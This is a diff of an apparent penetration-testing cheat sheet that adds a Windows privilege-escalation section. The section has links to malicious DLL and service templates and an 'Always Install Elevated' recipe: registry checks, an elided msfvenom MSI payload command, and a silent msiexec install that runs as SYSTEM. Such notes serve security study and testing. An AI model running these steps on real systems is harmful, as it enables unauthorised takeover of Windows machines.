@@ -56,15 +56,17 @@ echo "$PASSWORD" | runas /profile /user:$USER “$COMMAND”
 + [sudo.cmd](./assests/sudo.cmd)<sup><sub>[[copy&paste](assets/files/sudo.cmd.txt)]
 
 
-### Using Python Scripts without Python installed
-[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](assets/files/PyInstaller-3.6.zip)]
-```bash
-pyinstaller yourprogram.py
-```
+## Windows Privilege Escalation
 
-## Cross-compiling for Windows
+### Windows Service / DLL Templates
 
-#### C & C++
++ [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c) <sup><sub>[[archive](assets/files/windows_dll.c)]
+
++ [windows_service.c](https://github.com/sagishahar/scripts/blob/master/windows_service.c) <sup><sub>[[archive](assets/files/windows_service.c)]
+
+#### Cross-compiling for Windows
+
+##### C & C++
 
 ```bash
 # Setup
@@ -78,7 +80,7 @@ i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32
 i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
 ```
 
-#### C#
+##### C#
 
 ```bash
 # Setup 
@@ -87,6 +89,26 @@ sudo apt-get install mono-complete msbuild mono-roslyn
 
 # Building
 msbuild [src.sln]
+```
+
+#### Using Python Scripts without Python installed
+[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](assets/files/PyInstaller-3.6.zip)]
+```bash
+pyinstaller yourprogram.py
+```
+
+### Always Install Elevated
+```bash
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+# If both of these are 0x1 - you can install msi packages as system.
+# Generate MSI Payload with:
+msfvenom [blah blah blah] -f msi -o setup.msi
+
+# Execute it with:
+msiexec /quiet /qn /i setup.msi
+
 ```
 
 ## Exfiltration
